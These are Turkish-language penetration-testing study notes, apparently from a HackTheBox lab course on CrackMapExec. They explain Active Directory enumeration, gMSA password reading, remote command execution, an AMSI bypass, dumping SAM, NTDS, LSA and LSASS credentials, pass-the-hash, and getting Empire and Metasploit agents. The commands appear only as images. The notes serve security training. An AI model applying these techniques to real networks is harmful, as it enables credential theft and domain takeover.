+SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+
+### Enumerating Users and Groups
+
+![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
+![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
+![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
+![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+
+
+### İlginç Hesap Özelliklerini Numaralandırma
+
+ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+
+PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
+
+
+### PASSWD_NOTREQD Özniteliğinin Tanımlanması
+
+![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
+![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
+
+TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Kısıtlamasız Delegasyonun Belirlenmesi
+![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
+
+adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+
+
+### adminCount Özniteliğini Sorgulama
+![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
+![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
+![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+
+
+### Domain SID'sini numaralandırma
+
+Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+
+
+### Gathering the Domain SID
+
+![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
+![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+
+
+### Group Managed Service Accounts (gMSA)
+
+Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:
+
+* Otomatik parola yönetimi.
+* Basitleştirilmiş service principal name (SPN) yönetimi.
+* Yönetimi diğer yöneticilere devretme yeteneği
+
+Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+
+Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
+
+Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
+
+
+### Enumerating Accounts with gMSA Privileges
+![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
+![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
+
+Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+
+
+### gMSA Parolasını Edinme
+![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
+
+
+### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
+![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
+![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
+
+
+### RDP Screenshots
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+
+### Enumerate Login Prompt
+![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
+
+Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
+
+
+
+### Taking a Screenshot
+![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
+![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+
+
+Not: --screentime ve --res isteğe bağlı bayraklardır.
+
+Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
+
+
+Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
+
+
+
+
+
+### Command Execution
+
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+
+![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+
+Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+
+Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+
+
+
+### Command Execution as Administrator
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+
+
+### Bir Komutu Administrator Olarak Çalıştırma
+![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
+![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+
+### RID 500 Dışı Hesap Olarak Komut Yürütme
+Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+
+### Komutu localadmin olarak çalıştırma
+![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+
+
+### LocalAccountTokenFilterPolicy'yi Değiştirme
+![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
+
+![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+
+
+### Domain Hesabı Olarak Komut Yürütme
+LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+
+### Komutu Robert olarak çalıştır
+![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+
+### SMB ile Komut Yürütme
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
+
+Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+
+Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
+
+![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+
+
+### SMBExec Yöntemi ile Komut Yürütme
+![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
+
+
+### wmiexec aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
+![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
+
+12. AMSI baypas
+13. Payload'u gizleyin
+14. Payload'u çalıştırın
+
+### Özel AMSI Bypass Çalıştırma
+
+Bu teknikler PowerShell çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, --amsi-bypass seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:
+
+15. “Değiştirilmiş Amsi ScanBuffer Yaması” içeren dosyayı indirin
+
+
+### “Değiştirilmiş Amsi ScanBuffer Yaması” ile Bir Dosya Oluşturun
+![Pasted image 20241203101828.png](/img/user/resimler/Pasted%20image%2020241203101828.png)
+Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır
+
+### Komut Maksimum Uzunluğu Aşıyor
+![Pasted image 20241203102011.png](/img/user/resimler/Pasted%20image%2020241203102011.png)
+![Pasted image 20241203102018.png](/img/user/resimler/Pasted%20image%2020241203102018.png)
+
+16. Bu sorunu çözmek için, shantanukhande-amsi.ps1 dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.
+
+### PowerShell Komut Dosyasını Oluşturma ve Barındırma
+![Pasted image 20241203102127.png](/img/user/resimler/Pasted%20image%2020241203102127.png)
+
+Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.
+
+Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:
+
+
+### PowerShell Özel AMSI Bypass Kullanma
+![Pasted image 20241203102312.png](/img/user/resimler/Pasted%20image%2020241203102312.png)
+![Pasted image 20241203102346.png](/img/user/resimler/Pasted%20image%2020241203102346.png)
+
+
+### WinRM Kullanarak Komut Yürütme
+WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port 5985 ve HTTPS TCP port 5986'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için yönetici olmasını gerektirmemesidir. Administrators grubunun üyesiysek, Remote Management Users grubunun üyesiysek veya oturum yapılandırmasında açık PowerShell Remoting izinlerimiz varsa WinRM protokolünü kullanabiliriz.
+
+
+### Command Execution using WinRM
+![Pasted image 20241203102455.png](/img/user/resimler/Pasted%20image%2020241203102455.png)
+![Pasted image 20241203102501.png](/img/user/resimler/Pasted%20image%2020241203102501.png)
+
+
+
+### WinRM aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203102608.png](/img/user/resimler/Pasted%20image%2020241203102608.png)
+
+
+### Other PowerShell Options
+
+WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:
+
+![Pasted image 20241203102901.png](/img/user/resimler/Pasted%20image%2020241203102901.png)
+
+Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.
+
+
+### SSH Command Execution
+CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.
+
+### Command Execution with SSH
+![Pasted image 20241203103019.png](/img/user/resimler/Pasted%20image%2020241203103019.png)
+![Pasted image 20241203103028.png](/img/user/resimler/Pasted%20image%2020241203103028.png)
+![Pasted image 20241203103033.png](/img/user/resimler/Pasted%20image%2020241203103033.png)
+
+Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da public ve private anahtarları kullanmaktır. CrackMapExec, --key-file seçeneği ile private key kullanımını destekler. Anahtarın çalışması için OPENSSH formatında olması gerekir.
+
+
+### Private Key Kullanarak SSH ile Komut Yürütme
+![Pasted image 20241203103449.png](/img/user/resimler/Pasted%20image%2020241203103449.png)
+
+Not: Herhangi bir parola yapılandırılmamışsa, -p seçeneğini boş (“”) olarak ayarlamalıyız, aksi takdirde bir hata alırız
+
+Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
+
+
+### Gizli Bilgileri Bulma ve Kullanma
+Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+
+
+### SAM
+SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
+
+
+### Dumping SAM
+![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
+![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+
+### NTDS Active Directory Database
+
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+
+https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+
+Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+
+Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+
+
+### Domain Controller'dan NTDS veritabanını boşaltma
+![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
+![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
+![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
+![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
+![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
+![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+
+--ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+
+
+### Yalnızca KRBTGT Hesabının Boşaltılması
+![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
+
+Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+
+
+### Yalnızca Enabled Hesapları Gösterme
+![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
+![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
+![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
+![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+
+### Using the Secrets (hashes)
+
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
+
+
+### Using NTLM Hashes
+![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
+
+
+### LSA Secrets/Cached Credentials
+
+CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+
+LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+
+
+
+### LSA'yı inceleyin
+
+![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
+![Pasted image 20241203105942.png](/img/user/resimler/Pasted%20image%2020241203105942.png)
+
+DCC2$ ile başlayan hash formatı Domain Cached Credentials 2 (DCC2), MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse Hashcat kullanılarak kırılabilir çünkü bu algoritma NTLM'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri Pas the Hash saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, $DCC2$ 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.
+
+
+### Cracking Hashes
+![Pasted image 20241203110157.png](/img/user/resimler/Pasted%20image%2020241203110157.png)
+
+
+![Pasted image 20241203110211.png](/img/user/resimler/Pasted%20image%2020241203110211.png)
+![Pasted image 20241203110216.png](/img/user/resimler/Pasted%20image%2020241203110216.png)
+
+
+
+### LSASS'tan Gettings Secrets
+LSASS prosesinin belleği, Windows parolalarını açık metin olarak veya NTLM veya AES256/AES128 gibi diğer hash biçimlerini içerir. Belleği boşaltmak, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.
+
+CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:
+
+17. [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dökümündeki gerekli baytları uzaktan okumak için Impacket projesini ve kimlik bilgilerini çıkarmak için pypykatz kullanır.
+
+
+### Lsassy Module
+
+![Pasted image 20241203113833.png](/img/user/resimler/Pasted%20image%2020241203113833.png)
+
+18. Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft Procdump'ı ve kimlik bilgilerini çıkarmak için pypykatz'ı kullanır.
+
+
+### Procdump Module
+![Pasted image 20241203114045.png](/img/user/resimler/Pasted%20image%2020241203114045.png)
+![Pasted image 20241203114101.png](/img/user/resimler/Pasted%20image%2020241203114101.png)
+
+19. HandleKatz bu araç, LSASS'a klonlanmış handle'ların kullanımını göstererek aynı şekilde gizlenmiş bir bellek dökümü oluşturur
+
+
+### Handlekatz Module
+
+![Pasted image 20241203114136.png](/img/user/resimler/Pasted%20image%2020241203114136.png)
+![Pasted image 20241203114143.png](/img/user/resimler/Pasted%20image%2020241203114143.png)
+![Pasted image 20241203114156.png](/img/user/resimler/Pasted%20image%2020241203114156.png)
+
+
+20. Nanodump, LSASS prosesinin bir minidump'ını oluşturan esnek bir araçtır. LSASS'a bir handle açılması tespit edilebildiğinden, Nanodump LSASS'a mevcut handle'ları arayabilir. Bir tane bulunursa, onu kopyalayacak ve minidump oluşturmak için kullanacaktır. Böyle bir handle bulmanın garanti olmadığını unutmayın.
+
+
+### Nanodump Module
+
+![Pasted image 20241203114243.png](/img/user/resimler/Pasted%20image%2020241203114243.png)
+![Pasted image 20241203114252.png](/img/user/resimler/Pasted%20image%2020241203114252.png)
+![Pasted image 20241203114300.png](/img/user/resimler/Pasted%20image%2020241203114300.png)
+
+Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.
+
+
+### C2 Framework'te Oturumlar Alma
+CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla keşif yapmak veya Empire veya Metasploit gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir agent almak için CrackMapExec'i kullanabiliriz.
+
+Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.
+
+
+### Empire
+
+Web sitelerinde sağlanan kılavuzu kullanarak Empire framework'ü yükleyerek başlayacağız
+
+
+### Empire Server'ı Kurun ve Başlatın
+
+![Pasted image 20241203120126.png](/img/user/resimler/Pasted%20image%2020241203120126.png)
+
+Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz empireadmin kullanıcı adını ve HackTheBoxCME şifresini kullanacağız! .
+
+
+### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma
+![Pasted image 20241203120243.png](/img/user/resimler/Pasted%20image%2020241203120243.png)
+
+Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.
+
+CrackMapExec yapılandırma dosyası varsayılan olarak ~/.cme/cme.conf adresinde bulunur. [Empire] seçeneğini empireadmin kullanıcı adı ve HackTheBoxCME şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server 1337 portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.
+
+
+### CrackMapExec Configuration File
+
+![Pasted image 20241203120720.png](/img/user/resimler/Pasted%20image%2020241203120720.png)
+![Pasted image 20241203120727.png](/img/user/resimler/Pasted%20image%2020241203120727.png)
+
+Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya empire/client/config.yaml adresinde bulunur:
+
+
+### İnceleme
+
+![Pasted image 20241203120800.png](/img/user/resimler/Pasted%20image%2020241203120800.png)
+![Pasted image 20241203120806.png](/img/user/resimler/Pasted%20image%2020241203120806.png)
+
+Yapılandırma dosyaları değiştirildikten sonra, Empire istemcisi ile Empire sunucusuna bağlanmalıyız
+
+
+### Empire Client Connection
+
+![Pasted image 20241203120835.png](/img/user/resimler/Pasted%20image%2020241203120835.png)
+![Pasted image 20241203120840.png](/img/user/resimler/Pasted%20image%2020241203120840.png)
+![Pasted image 20241203120846.png](/img/user/resimler/Pasted%20image%2020241203120846.png)
+
+Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.
+
+
+### Empire Setting up IP and Port
+![Pasted image 20241203120914.png](/img/user/resimler/Pasted%20image%2020241203120914.png)
+
+Artık dinleyicimiz çalışıyor ve empire_exec modülü ile Empire'a bir agent almak için CrackMapExec'i kullanabiliriz. Ayarladığımız dinleyici olan LISTENER=http seçeneğini eklememiz gerekiyor.
+
+
+### CrackMapExec Modülünü Kullanma empire_exec
+
+![Pasted image 20241203121001.png](/img/user/resimler/Pasted%20image%2020241203121001.png)
+
+Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.
+
+![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)
+
+
+### Metasploit
+
+Aynı şeyi CrackMapExec modülü web_delivery kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te web_delivery modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve web_delivery işleyicisini yapılandıralım
+
+
+### Metasploit Configure web_delivery Handler
+
+![Pasted image 20241203121139.png](/img/user/resimler/Pasted%20image%2020241203121139.png)
+![Pasted image 20241203121202.png](/img/user/resimler/Pasted%20image%2020241203121202.png)
+
